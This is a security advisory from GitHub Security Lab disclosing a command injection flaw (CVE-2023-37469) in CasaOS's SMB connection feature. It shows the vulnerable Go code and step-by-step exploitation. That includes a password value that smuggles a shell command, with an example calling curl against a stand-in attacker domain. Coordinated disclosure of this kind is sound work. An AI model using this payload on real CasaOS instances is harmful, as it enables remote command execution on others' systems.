
[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

August 21, 2023
# GHSL-2022-119: Arbitrary command execution in CasaOS - CVE-2023-37469

[![Author avatar](https://avatars.githubusercontent.com/u/11400619)
Kevin Stubbings](https://github.com/Kwstubbs)

## Coordinated Disclosure Timeline

* 2022-11-17: Attempted to contact maintainer via email. No response.
* 2022-11-27: Contacted maintainer via Discord. Maintainer acknowledges and says a patch will be included in next release.
* 2022-11-28: Maintainer patches vulnerability.
* 2022-12-13: Release v0.40 is published.
* 2023-01-03: Review of release v0.40 results in insufficient patch. Maintainer is contacted to help fix issue.
* 2023-06-14: Maintainer fixes issue in version v0.4.4

## Summary

If an authenticated user using CasaOS is able to successfully connect to a controlled SMB server, they are able to execute arbitrary commands.

## Product

CasaOS

## Tested Version

[v3.7-1](https://github.com/IceWhaleTech/CasaOS/releases/tag/v0.3.7-1)

## Details

### Issue: command injection in `PostSambaConnectionsCreate` (`GHSL-2022-119`)

The [MountSmaba](https://github.com/IceWhaleTech/CasaOS/blob/96e92842357230098c771bc41fd3baf46189b859/service/connections.go#L58) function is called by [PostSambaConnectionsCreate](https://github.com/IceWhaleTech/CasaOS/blob/96e92842357230098c771bc41fd3baf46189b859/route/v1/samba.go#L121) with none of the inputs sanitized. The parameters are used to confirm an SMB share can be authenticated, but if malicious parameters are valid on the SMB end, command injection is possible.

```
func (s *connectionsStruct) MountSmaba(username, host, directory, port, mountPoint, password string) string {
	str := command2.ExecResultStr("source " + config.AppInfo.ShellPath + "/helper.sh ;MountCIFS " + username + " " + host + " " + directory + " " + port + " " + mountPoint + " " + password)
	return str
}

```
#### Impact

This issue may lead to Command Injection.

#### Resources

In this exploit, we will exploit the password parameter.

1. Create a SMB share with any path, any share name, and any username.
2. Set the password of the user to be `;CMD=$'\x20arg1';command$CMD`
   > For example, if I wanted to access a website, I could do `;CMD=$'\x20attackerdomain.com';curl$CMD`
3. Go to Files->Location->Connect Network Storage and Enter the share path, username, password and your command should execute.

## CVE

* CVE-2023-37469

## Credit

This issue was discovered and reported by GHSL team member [@Kwstubbs (Kevin Stubbings)](https://github.com/Kwstubbs) and found with the help of the [`go/command-injection`](https://github.com/github/codeql/blob/main/go/ql/src/Security/CWE-078/CommandInjection.ql) CodeQL query.

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2022-119` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. Â©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information

